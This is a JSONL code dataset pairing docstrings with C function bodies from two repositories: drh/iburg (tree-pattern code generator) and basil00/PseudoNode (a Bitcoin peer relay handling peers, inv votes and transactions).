{"docstring": "/* stringf - format and save a string */\n", "func_signal": "static char *stringf(char *fmt, ...)", "code": "{\n\tva_list ap;\n\tchar *s, buf[512];\n\n\tva_start(ap, fmt);\n\tvsprintf(buf, fmt, ap);\n\tva_end(ap);\n\treturn strcpy(alloc(strlen(buf) + 1), buf);\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* ckreach - mark all non-terminals reachable from p */\n", "func_signal": "static void ckreach(Nonterm p)", "code": "{\n\tRule r;\n\n        p->reached = 1;\n\tfor (r = p->rules; r; r = r->decode)\n\t\treach(r->pattern);\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitkids - emit burm_kids */\n", "func_signal": "static void emitkids(Rule rules, int nrules)", "code": "{\n\tint i;\n\tRule r, *rc = alloc((nrules + 1)*sizeof *rc);\n\tchar **str  = alloc((nrules + 1)*sizeof *str);\n\n\tfor (i = 0, r = rules; r; r = r->link) {\n\t\tint j = 0;\n\t\tchar buf[1024], *bp = buf;\n\t\t*computekids(r->pattern, \"p\", bp, &j) = 0;\n\t\tfor (j = 0; str[j] && strcmp(str[j], buf); j++)\n\t\t\t;\n\t\tif (str[j] == NULL)\n\t\t\tstr[j] = strcpy(alloc(strlen(buf) + 1), buf);\n\t\tr->kids = rc[j];\n\t\trc[j] = r;\n\t}\n\tprint(\"NODEPTR_TYPE *%Pkids(NODEPTR_TYPE p, int eruleno, NODEPTR_TYPE kids[]) {\\n\"\n\"%1%Passert(p, PANIC(\\\"NULL tree in %Pkids\\\\n\\\"));\\n\"\n\"%1%Passert(kids, PANIC(\\\"NULL kids in %Pkids\\\\n\\\"));\\n\"\n\"%1switch (eruleno) {\\n\");\n\tfor (i = 0; r = rc[i]; i++) {\n\t\tfor ( ; r; r = r->kids)\n\t\t\tprint(\"%1case %d: /* %R */\\n\", r->ern, r);\n\t\tprint(\"%s%2break;\\n\", str[i]);\n\t}\n\tprint(\"%1default:\\n%2%Passert(0, PANIC(\\\"Bad external rule number %%d in %Pkids\\\\n\\\", eruleno));\\n%1}\\n%1return kids;\\n}\\n\\n\");\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* reach - mark all non-terminals in tree t as reachable */\n", "func_signal": "static void reach(Tree t)", "code": "{\n\tNonterm p = t->op;\n\n\tif (p->kind == NONTERM)\n\t\tif (!p->reached)\n\t\t\tckreach(p);\n\tif (t->left)\n\t\treach(t->left);\n\tif (t->right)\n\t\treach(t->right);\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* computents - fill in bp with burm_nts vector for tree t */\n", "func_signal": "static char *computents(Tree t, char *bp)", "code": "{\n\tif (t) {\n\t\tNonterm p = t->op;\n\t\tif (p->kind == NONTERM) {\n\t\t\tsprintf(bp, \"%s_%s_NT, \", prefix, p->name);\n\t\t\tbp += strlen(bp);\n\t\t} else\n\t\t\tbp = computents(t->right, computents(t->left,  bp));\n\t}\n\treturn bp;\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitclosure - emit the closure functions */\n", "func_signal": "static void emitclosure(Nonterm nts)", "code": "{\n\tNonterm p;\n\n\tfor (p = nts; p; p = p->link)\n\t\tif (p->chain)\n\t\t\tprint(\"static void %Pclosure_%S(struct %Pstate *, int);\\n\", p);\n\tprint(\"\\n\");\n\tfor (p = nts; p; p = p->link)\n\t\tif (p->chain) {\n\t\t\tRule r;\n\t\t\tprint(\"static void %Pclosure_%S(struct %Pstate *p, int c) {\\n\", p);\n\t\t\tfor (r = p->chain; r; r = r->chain)\n\t\t\t\temitrecord(\"\\t\", r, r->cost);\n\t\t\tprint(\"}\\n\\n\");\n\t\t}\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* rule - create & initialize a rule with the given fields */\n", "func_signal": "Rule rule(char *id, Tree pattern, int ern, int cost)", "code": "{\n\tRule r = alloc(sizeof *r), *q;\n\tTerm p = pattern->op;\n\n\tnrules++;\n\tr->lhs = nonterm(id);\n\tr->packed = ++r->lhs->lhscount;\n\tfor (q = &r->lhs->rules; *q; q = &(*q)->decode)\n\t\t;\n\t*q = r;\n\tr->pattern = pattern;\n\tr->ern = ern;\n\tr->cost = cost;\n\tif (p->kind == TERM) {\n\t\tr->next = p->rules;\n\t\tp->rules = r;\n\t} else if (pattern->left == NULL && pattern->right == NULL) {\n\t\tNonterm p = pattern->op;\n\t\tr->chain = p->chain;\n\t        p->chain = r;\n\t}\n\tfor (q = &rules; *q && (*q)->ern < r->ern; q = &(*q)->link)\n\t\t;\n\tif (*q && (*q)->ern == r->ern)\n\t\tyyerror(\"duplicate external rule number `%d'\\n\", r->ern);\n\tr->link = *q;\n\t*q = r;\n\treturn r;\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* term - create a new terminal id with external symbol number esn */\n", "func_signal": "Term term(char *id, int esn)", "code": "{\n\tTerm p = lookup(id), *q = &terms;\n\n\tif (p)\n\t\tyyerror(\"redefinition of terminal `%s'\\n\", id);\n\telse\n\t\tp = install(id);\n\tp->kind = TERM;\n\tp->esn = esn;\n\tp->arity = -1;\n\twhile (*q && (*q)->esn < p->esn)\n\t\tq = &(*q)->link;\n\tif (*q && (*q)->esn == p->esn)\n\t\tyyerror(\"duplicate external symbol number `%s=%d'\\n\",\n\t\t\tp->name, p->esn);\n\tp->link = *q;\n\t*q = p;\n\treturn p;\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitterms - emit terminal data structures */\n", "func_signal": "static void emitterms(Term terms)", "code": "{\n\tTerm p;\n\tint k;\n\n\tprint(\"char %Parity[] = {\\n\");\n\tfor (k = 0, p = terms; p; p = p->link) {\n\t\tfor ( ; k < p->esn; k++)\n\t\t\tprint(\"%10,%1/* %d */\\n\", k);\n\t\tprint(\"%1%d,%1/* %d=%S */\\n\", p->arity < 0 ? 0 : p->arity, k++, p);\n\t}\n\tprint(\"};\\n\\n\");\n\tif (Iflag) {\n\t\tprint(\"char *%Popname[] = {\\n\");\n\t\tfor (k = 0, p = terms; p; p = p->link) {\n\t\t\tfor ( ; k < p->esn; k++)\n\t\t\t\tprint(\"%1/* %d */%10,\\n\", k);\n\t\t\tprint(\"%1/* %d */%1\\\"%S\\\",\\n\", k++, p);\n\t\t}\n\t\tprint(\"};\\n\\n\");\n\t}\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitcost - emit cost computation for tree t */\n", "func_signal": "static void emitcost(Tree t, char *v)", "code": "{\n\tNonterm p = t->op;\n\n\tif (p->kind == TERM) {\n\t\tif (t->left)\n\t\t\temitcost(t->left,  stringf(\"%s->left\",  v));\n\t\tif (t->right)\n\t\t\temitcost(t->right, stringf(\"%s->right\", v));\n\t} else\n\t\tprint(\"%s->cost[%P%S_NT] + \", v, p);\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* closure - fill in cost & rule with results of chain rules w/p as rhs */\n", "func_signal": "static void closure(int cost[], Rule rule[], Nonterm p, int c)", "code": "{\n\tRule r;\n\n\tfor (r = p->chain; r; r = r->chain)\n\t\tif (c + r->cost < cost[r->lhs->number]) {\n\t\t\tcost[r->lhs->number] = c + r->cost;\n\t\t\trule[r->lhs->number] = r;\n\t\t\tclosure(cost, rule, r->lhs, c + r->cost);\n\t\t}\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitdefs - emit non-terminal defines and data structures */\n", "func_signal": "static void emitdefs(Nonterm nts, int ntnumber)", "code": "{\n\tNonterm p;\n\n\tfor (p = nts; p; p = p->link)\n\t\tprint(\"#define %P%S_NT %d\\n\", p, p->number);\n\tprint(\"int %Pmax_nt = %d;\\n\\n\", ntnumber);\n\tif (Iflag) {\n\t\tprint(\"char *%Pntname[] = {\\n%10,\\n\");\n\t\tfor (p = nts; p; p = p->link)\n\t\t\tprint(\"%1\\\"%S\\\",\\n\", p);\n\t\tprint(\"%10\\n};\\n\\n\");\n\t}\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emittest - emit clause for testing a match */\n", "func_signal": "static void emittest(Tree t, char *v, char *suffix)", "code": "{\n\tTerm p = t->op;\n\n\tif (p->kind == TERM) {\n\t\tprint(\"%3%s->op == %d%s/* %S */\\n\", v, p->esn,\n\t\t\tt->nterms > 1 ? \" && \" : suffix, p);\n\t\tif (t->left)\n\t\t\temittest(t->left, stringf(\"%s->left\",  v),\n\t\t\t\tt->right && t->right->nterms ? \" && \" : suffix);\n\t\tif (t->right)\n\t\t\temittest(t->right, stringf(\"%s->right\", v), suffix);\n\t}\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* install - install symbol name */\n", "func_signal": "static void *install(char *name)", "code": "{\n\tstruct entry *p = alloc(sizeof *p);\n\tint i = hash(name)%HASHSIZE;\n\n\tp->sym.name = name;\n\tp->link = table[i];\n\ttable[i] = p;\n\treturn &p->sym;\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "/* emitnts - emit burm_nts ragged array */\n", "func_signal": "static void emitnts(Rule rules, int nrules)", "code": "{\n\tRule r;\n\tint i, j, *nts = alloc(nrules*sizeof *nts);\n\tchar **str = alloc(nrules*sizeof *str);\n\n\tfor (i = 0, r = rules; r; r = r->link) {\n\t\tchar buf[1024];\n\t\t*computents(r->pattern, buf) = 0;\n\t\tfor (j = 0; str[j] && strcmp(str[j], buf); j++)\n\t\t\t;\n\t\tif (str[j] == NULL) {\n\t\t\tprint(\"static short %Pnts_%d[] = { %s0 };\\n\", j, buf);\n\t\t\tstr[j] = strcpy(alloc(strlen(buf) + 1), buf);\n\t\t}\n\t\tnts[i++] = j;\n\t}\n\tprint(\"\\nshort *%Pnts[] = {\\n\");\n\tfor (i = j = 0, r = rules; r; r = r->link) {\n\t\tfor ( ; j < r->ern; j++)\n\t\t\tprint(\"%10,%1/* %d */\\n\", j);\n\t\tprint(\"%1%Pnts_%d,%1/* %d */\\n\", nts[i++], j++);\n\t}\n\tprint(\"};\\n\\n\");\n}", "path": "iburg.c", "repo_name": "drh/iburg", "stars": 84, "license": "other", "language": "c", "size": 216}
{"docstring": "// Close a peer.\n", "func_signal": "static void close_peer(struct state *S, struct peer *peer)", "code": "{\n    struct in6_addr addr = peer->to_addr;\n    del_peer(S, peer->index);\n    peer->error = true;\n    deref_peer(peer);\n    if (rand64(S) % 8 != 0)     // Maybe re-use peer?\n        insert_address(S, addr, time(NULL) - rand64(S) % 3000);\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Get the vote associated with `hsh'.\n", "func_signal": "static uint64_t get_vote(struct table *table, uint256_t hsh)", "code": "{\n    mutex_lock(&table->lock);\n    struct entry *entry = get_entry(table, hsh);\n    uint64_t vote = (entry != NULL? entry->vote: 0);\n    mutex_unlock(&table->lock);\n    return vote;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Relay a transaction.\n", "func_signal": "static void relay_transaction(struct state *S, struct peer *peer,\n    uint64_t mask, uint256_t tx_hsh)", "code": "{\n    if (peer != NULL)\n        action(S, peer->to_addr, \"relay: \" HASH_FORMAT \" (tx)\", HASH(tx_hsh));\n    struct buf *out = alloc_buf(NULL);\n    make_inv(S, out, MSG_TX, tx_hsh);\n    relay_message(S, peer, mask, out);\n    deref_buf(out);\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Allocate a slot for a new peer.\n", "func_signal": "static ssize_t alloc_peer(struct state *S, bool outbound)", "code": "{\n    mutex_lock(&S->peer_lock);\n    ssize_t start = (outbound? 0: S->num_peers);\n    ssize_t end   = (outbound? S->num_peers: S->peers_len);\n    ssize_t idx = -1;\n    for (size_t i = start; i < end; i++)\n    {\n        if (S->peers[i] == NULL)\n        {\n            S->peers[i] = PEER_RESERVE;\n            idx = i;\n            if (idx > S->last_idx)\n                S->last_idx = idx;\n            break;\n        }\n    }\n    if (!outbound && idx == -1)\n    {\n        idx = S->peers_len;\n        size_t len = (3 * S->peers_len) / 2 + 4;\n        struct peer **new_peers = mem_alloc(len * sizeof(struct peer *));\n        memset(new_peers, 0, len * sizeof(struct peer *));\n        memcpy(new_peers, S->peers, S->peers_len * sizeof(struct peer *));\n        S->peers_len = len;\n        struct peer **old_peers = S->peers;\n        S->peers = new_peers;\n        mem_free(old_peers);\n        S->peers[idx] = PEER_RESERVE;\n        S->last_idx = idx;\n    }\n    if (idx != -1 && outbound)\n        S->num_outs++;\n    if (idx != -1 && !outbound)\n        S->num_ins++;\n    mutex_unlock(&S->peer_lock);\n    return idx;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Get the list of delayed peers associated with `hsh'.   Also resets this\n// list to be empty.\n", "func_signal": "static struct delay *get_delays(struct table *table, uint256_t hsh)", "code": "{\n    struct delay *delays = NULL;\n    mutex_lock(&table->lock);\n    struct entry *entry = get_entry(table, hsh);\n    if (entry != NULL)\n    {\n        delays = entry->delays;\n        entry->delays = NULL;\n    }\n    mutex_unlock(&table->lock);\n    return delays;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Handle \"tx\".  If OK, cache the tx and forward it to any delayed peers.\n", "func_signal": "static bool handle_tx(struct peer *peer, struct state *S, struct buf *in,\n    unsigned len)", "code": "{\n    char *tx = pop_data(in, len);\n    uint256_t tx_hsh = hash(tx, len);\n\n    // Check that we actually requested the tx, otherwise ignore.\n    if (get_state(S->table, tx_hsh) < FETCHING)\n    {\n        mem_free(tx);\n        warning(S, peer->to_addr, \"ignoring unsolicited transaction \"\n            HASH_FORMAT_SHORT, HASH_SHORT(tx_hsh));\n        return true;\n    }\n\n    // Run callback on tx.\n    char *tx0 = tx;\n    if (S->cb_tx != NULL)\n        tx = (char *)S->cb_tx((struct PN *)S, PN_CALLBACK_TX, peer->to_addr,\n            (unsigned char *)tx, &len);\n    if (tx != tx0)\n    {\n        free(tx);\n        delete(S->table, tx_hsh);\n        return true;\n    }\n\n    // Forward the tx.\n    struct delay *delays = get_delays(S->table, tx_hsh);\n    if (delays != NULL)\n    {\n        struct buf *out = alloc_buf(NULL);\n        make_tx(S, out, tx, len);\n        wake_delays(S, tx_hsh, delays, out, \"tx\");\n        deref_buf(out);\n    }\n\n    // Cache the tx.\n    if (!set_data(S->table, tx_hsh, tx, len))\n    {\n        mem_free(tx);\n        warning(S, peer->to_addr, \"received duplicate transaction\");\n    }\n    return true;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Set the state associated with `hsh'.  Return the old state.\n", "func_signal": "static unsigned set_state(struct table *table, uint256_t hsh, unsigned state)", "code": "{\n    time_t curr_time = time(NULL);\n    unsigned old_state = MISSING;\n    mutex_lock(&table->lock);\n    struct entry *entry = get_entry(table, hsh);\n    if (entry != NULL && entry->state < state)\n    {\n        old_state = entry->state;\n        entry->state = state;\n        entry->time = curr_time;\n    }\n    mutex_unlock(&table->lock);\n    return old_state;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Return a 64-bit random number.\n", "func_signal": "static uint64_t rand64(struct state *S)", "code": "{\n    mutex_lock(&S->rand_lock);\n    if (S->rnum_idx >= sizeof(uint256_t) / sizeof(uint64_t))\n    {\n        S->state[0]++;\n        if (S->state[0] == 0)\n            S->state[1]++;\n        S->rnum = sha256(S->state, sizeof(S->state));\n        S->rnum_idx = 0;\n    }\n    uint64_t r = S->rnum.i64[S->rnum_idx++];\n    mutex_unlock(&S->rand_lock);\n    return r;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Pop a varstr from the buffer.\n", "func_signal": "static char *pop_varstr(struct buf *buf)", "code": "{\n    size_t len = pop_varint(buf);\n    if (buf->ptr + len > buf->len)\n        pop_error(buf->env, len);\n    char *s = (char *)mem_alloc(len+1);\n    memcpy(s, buf->data + buf->ptr, len);\n    s[len] = '\\0';\n    buf->ptr += len;\n    return s;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Get the data associated with `hsh', otherwise return NULL.  If non-NULL\n// data is returned, then the entry reference count is increased.\n", "func_signal": "static void *get_data(struct table *table, uint256_t hsh, size_t *lenptr)", "code": "{\n    void *data = NULL;\n    if (lenptr != NULL)\n        *lenptr = 0;\n    mutex_lock(&table->lock);\n    struct entry *entry = get_entry(table, hsh);\n    if (entry != NULL)\n    {\n        data = entry->data;\n        if (lenptr != NULL)\n            *lenptr = (size_t)entry->len;\n        if (data != NULL)\n            entry->ref_count++;\n    }\n    mutex_unlock(&table->lock);\n    return data;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Get the time associated with `hsh'.\n", "func_signal": "static time_t get_time(struct table *table, uint256_t hsh)", "code": "{\n    time_t time = 0;\n    mutex_lock(&table->lock);\n    struct entry *entry = get_entry(table, hsh);\n    if (entry != NULL)\n        time = entry->time;\n    mutex_unlock(&table->lock);\n    return time;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Invoke a callback on a struct buf.\n", "func_signal": "static bool callback_buf(struct state *S, unsigned type, struct in6_addr addr,\n    struct buf *in, PN_callback f)", "code": "{\n    unsigned len = in->ptr;\n    unsigned char *new_data = f((struct PN *)S, type, addr,\n        (unsigned char *)in->data, &len);\n    if (new_data == NULL)\n    {\n        in->len = in->ptr = 0;\n        in->data = NULL;\n        return false;\n    }\n    in->len = in->ptr = len;\n    in->data = (char *)new_data;\n    return true;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Get information.\n", "func_signal": "extern int PN_get_info(struct PN *node, int what)", "code": "{\n    if (node == NULL)\n        return 0;\n    struct state *S = (struct state *)node;\n    switch (what)\n    {\n        case PN_HEIGHT:\n            return (int)get_height(S);\n        case PN_NUM_IN_PEERS:\n            return (int)S->num_ins;\n        case PN_NUM_OUT_PEERS:\n            return (int)S->num_outs;\n        case PN_NUM_SEND_BYTES:\n            return (int)S->send_bytes;\n        case PN_NUM_RECV_BYTES:\n            return (int)S->recv_bytes;\n        default:\n            return 0;\n    }\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// pop_error() will be called if a message is truncated.\n", "func_signal": "static int pop_error(jmp_buf *env, size_t len)", "code": "{\n    assert(env != NULL);\n    longjmp(*env, 1);\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Pend a fetch_data request.\n", "func_signal": "static void pend_fetch(struct state *S, uint256_t hsh, uint32_t type,\n    bool sync, uint64_t nonce, int8_t ttl)", "code": "{\n    if (ttl <= 0)\n        return;     // Give up...\n    struct fetch *req = (struct fetch *)mem_alloc(sizeof(struct fetch));\n    req->time = time(NULL) + (type == MSG_BLOCK? 30: 10);\n    req->ttl   = ttl;\n    req->nonce = nonce;\n    req->sync  = sync;\n    req->type  = type;\n    req->hash  = hsh;\n    mutex_lock(&S->pending_lock);\n    req->next = S->pending;\n    S->pending = req;\n    mutex_unlock(&S->pending_lock);\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Wake all delayed peers (set by set_delay()) that are waiting on some\n// message data,  Also clears all delays.  The message to send is stored in\n// `out'.\n", "func_signal": "static void wake_delays(struct state *S, uint256_t hsh, struct delay *delays,\n    struct buf *out, const char *type)", "code": "{\n    while (delays != NULL)\n    {\n        struct delay *d = delays;\n        struct peer *p = get_peer(S, d->index, d->nonce);\n        if (p != NULL)\n        {\n            action(S, p->to_addr, \"send: \" HASH_FORMAT_SHORT \" (%s)\",\n                HASH_SHORT(hsh), type);\n            send_message(p, out);\n            score_peer(S, p, -10);\n        }\n        deref_peer(p);\n        delays = delays->next;\n        mem_free(d);\n    }\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Handle \"inv\".  Each inv message is treated as a vote as to the validity\n// of the data.  Once the vote tally reaches THRESHOLD, then the data is\n// considered valid.\n", "func_signal": "static bool handle_inv(struct peer *peer, struct state *S, struct buf *in)", "code": "{\n    size_t len = pop_varint(in);\n    static const size_t MAX_LEN = 50000;\n    if (len > MAX_LEN)\n        return false;\n\n    for (size_t i = 0; i < len; i++)\n    {\n        uint32_t type = pop(in, uint32_t);\n        uint256_t hsh = pop(in, uint256_t);\n\n        // Votes from inbound peers are not trusted.  Otherwise it would be\n        // trivial for an attacker to fool PseudoNode into relaying invalid\n        // data.  We parse the message anyway to check for errors.\n        if (!peer->outbound) \n            continue;\n   \n        // Callback:\n        if (S->cb_inv != NULL)\n        {\n            struct inv *vec = mem_alloc(sizeof(struct inv));\n            vec->type = type;\n            vec->hash = hsh;\n            unsigned len = sizeof(struct inv);\n            vec = (struct inv *)S->cb_inv((struct PN *)S, PN_CALLBACK_INV,\n                peer->to_addr, (unsigned char *)vec, &len);\n            if (vec == NULL || len != sizeof(struct inv))\n            {\n                mem_free(vec);\n                continue;\n            }\n            type = vec->type;\n            hsh  = vec->hash;\n            mem_free(vec);\n        }\n \n        // For each type (tx or block), register the vote.  If we have reached\n        // the THRESHOLD number of votes, then PseudoNode treats the data as\n        // valid, and relay it to other peers.\n        if (type != MSG_TX && type != MSG_BLOCK)\n        {\n            warning(S, peer->to_addr, \"NYI inv type (%u)\", type);\n            continue;\n        }\n        uint64_t votes = vote(S->table, hsh, (type == MSG_TX? TX: BLOCK),\n            peer->index, S);\n        size_t count = tally(votes);\n        if (count == 1)\n        {\n            int16_t invs = peer->inv_score++;\n            if (invs > MAX_INVS)\n            {\n                // This peer is inv-flooding, disconnect.\n                warning(S, peer->to_addr, \"too many invs\");\n                return false;\n            }\n            if (type == MSG_BLOCK && !peer->local_sync)\n            {\n                // This peer thinks we have an out-of-date height, so do\n                // not trust block invs.  Instead, silently disconnect.\n                return false;\n            }\n        }\n        if (count != S->threshold)\n            continue;\n\n        // Vote threshold reached; take some action.\n        switch (type)\n        {\n            case MSG_TX:\n                relay_transaction(S, peer, votes, hsh);\n                break;\n            case MSG_BLOCK:\n                // PseudoNode assumes only new blocks are actively advertised.\n                // This seems to work well in practice for THRESHOLD >= 2.\n                relay_block(S, peer, votes, hsh);\n                height_inc(S);\n                garbage_collect(S->table);          // Clean-up stale data.\n                reset_peers(S);\n                queue_shuffle(S);\n                break;\n        }\n\n        // If enabled, we prefetch data rather than waiting for a node to\n        // explicitly request it.  Consumes more bandwidth but makes\n        // PseudoNode faster.\n        if (S->prefetch)\n        {\n            unsigned state = set_state(S->table, hsh, FETCHING);\n            if (state != OBSERVED)\n                continue;\n            if (!fetch_data(S, NULL, type, hsh, false,\n                    get_vote(S->table, hsh), TTL_INIT))\n                delete(S->table, hsh);     // Fail-safe (unlikely)\n        }\n    }\n    return true;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Get the total number of peers (approx.)\n", "func_signal": "static size_t get_num_peers(struct state *S)", "code": "{\n    mutex_lock(&S->peer_lock);\n    size_t num_peers = S->last_idx+1;\n    mutex_unlock(&S->peer_lock);\n    return num_peers;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Process a message.\n", "func_signal": "static bool process_message(struct peer *peer, struct state *S,\n    struct buf *in)", "code": "{\n    if (S->cb_raw != NULL &&\n            !callback_buf(S, PN_CALLBACK_RAW, peer->to_addr, in, S->cb_raw))\n        return true;\n\n    struct header hdr = pop(in, struct header);\n    size_t len = hdr.length;\n\n    bool ok = true;\n    if (strcmp(hdr.command, \"version\") == 0)\n        ok = handle_version(peer, S, in, len);\n    else if (strcmp(hdr.command, \"verack\") == 0)\n        ok = true;\n    else if (strcmp(hdr.command, \"addr\") == 0)\n        ok = handle_addr(peer, S, in);\n    else if (strcmp(hdr.command, \"getaddr\") == 0)\n        ok = handle_getaddr(peer, S, in);\n    else if (strcmp(hdr.command, \"inv\") == 0)\n        ok = handle_inv(peer, S, in);\n    else if (strcmp(hdr.command, \"tx\") == 0)\n        ok = handle_tx(peer, S, in, len);\n    else if (strcmp(hdr.command, \"block\") == 0)\n        ok = handle_block(peer, S, in, len);\n    else if (strcmp(hdr.command, \"getdata\") == 0)\n        ok = handle_getdata(peer, S, in);\n    else if (strcmp(hdr.command, \"getheaders\") == 0)\n        ok = handle_getheaders(peer, S, in);\n    else if (strcmp(hdr.command, \"headers\") == 0)\n        ok = handle_headers(peer, S, in);\n    else if (strcmp(hdr.command, \"notfound\") == 0)\n        ok = handle_notfound(peer, S, in);\n    else if (strcmp(hdr.command, \"ping\") == 0)\n    {\n        uint64_t nonce = pop(in, uint64_t);\n        struct buf *out = alloc_buf(NULL);\n        make_pong(S, out, nonce);\n        send_message(peer, out);\n        deref_buf(out);\n    }\n    else if (strcmp(hdr.command, \"filterload\") == 0)\n        ok = false;         // NYI so drop connection.\n    else if (strcmp(hdr.command, \"reject\") == 0)\n    {\n        score_peer(S, peer, 16);\n        char *message = pop_varstr(in);\n        pop(in, uint8_t);\n        char *reason = pop_varstr(in);\n        warning(S, peer->to_addr, \"message (%s) rejected by peer (%s)\",\n            message, reason);\n        mem_free(message);\n        mem_free(reason);\n    }\n    else if (strcmp(hdr.command, \"getblocks\") == 0)\n        ok = true;          // Safe to ignore.\n    else\n        warning(S, peer->to_addr, \"ignoring unknown or NYI command \\\"%s\\\"\",\n            hdr.command);\n\n    return ok;\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
{"docstring": "// Test if an address is \"good\" or not, i.e. is public, routable, etc.\n", "func_signal": "static bool is_good_address(struct in6_addr addr)", "code": "{\n    uint16_t addrv6[8];\n    for (size_t i = 0; i < 8; i++)\n        addrv6[i] = ntohs(addr.s6_addr16[i]);\n    bool is_ipv4 = (addrv6[0] == 0 && addrv6[1] == 0 && addrv6[2] == 0 &&\n                    addrv6[3] == 0 && addrv6[4] == 0 && addrv6[5] == 0xFFFF);\n    uint8_t addrv4[4] = {addrv6[6] >> 8, addrv6[6] & 0xFF,\n                         addrv6[7] >> 8, addrv6[7] & 0xFF};\n    if (is_ipv4)\n    {\n        switch (addrv4[0])\n        {\n            case 0:\n                return false;                                   // 0-prefix\n            case 127:\n                return false;                                   // Local\n            case 10:\n                return false;                                   // RFC1918\n            case 172:\n                return (addrv4[1] < 16 || addrv4[1] > 31);      // RFC1918\n            case 192:\n                return (addrv4[1] != 168);                      // RFC1918\n            case 169:\n                return (addrv4[1] != 254);                      // RFC3927\n            case 224: case 225: case 226: case 227: case 228: case 229:\n            case 230: case 231: case 232: case 234: case 235: case 236:\n            case 237: case 238: case 239:\n                return false;                                   // Multicast\n            default:\n                return true;\n        }\n    }\n    else\n    {\n        if (addrv6[0] == 0x2002)\n            return false;                                       // RFC3964\n        if (addrv6[0] == 0x0064 && addrv6[1] == 0xFF9B)\n            return false;                                       // RFC6052\n        if (addrv6[0] == 0x2001 && addrv6[1] == 0x0000)\n            return false;                                       // RFC4380\n        if (addrv6[0] == 0x2001 && addrv6[1] == 0x0DB8)\n            return false;                                       // RFC3849\n        if (addrv6[0] == 0x2001 && addrv6[1] == 0x0010)\n            return false;                                       // RFC4843\n        if (((addrv6[0] >> 8) & 0xFE) == 0xFC)\n            return false;                                       // Local\n        if ((addrv6[0] >> 8) == 0xFF)\n            return false;                                       // Multicast\n        static const uint16_t zerov6[] = {0, 0, 0, 0, 0, 0, 0, 0};\n        if (memcmp(addrv6, zerov6, sizeof(zerov6) - 2*sizeof(uint16_t)) == 0)\n            return false;                                       // 0-addr\n        static const uint16_t localv6[] = {0, 0, 0, 0, 0, 0, 0, 1};\n        if (memcmp(addrv6, localv6, sizeof(localv6)) == 0)\n            return false;                                       // Local\n        static const uint16_t rfc4862v6[] = {0xFE80, 0, 0, 0, 0, 0, 0, 0};\n        if (memcmp(addrv6, rfc4862v6, sizeof(rfc4862v6)) == 0)\n            return false;                                       // RFC4862\n        return true;\n    }\n}", "path": "pseudo_node.c", "repo_name": "basil00/PseudoNode", "stars": 77, "license": "mit", "language": "c", "size": 272}
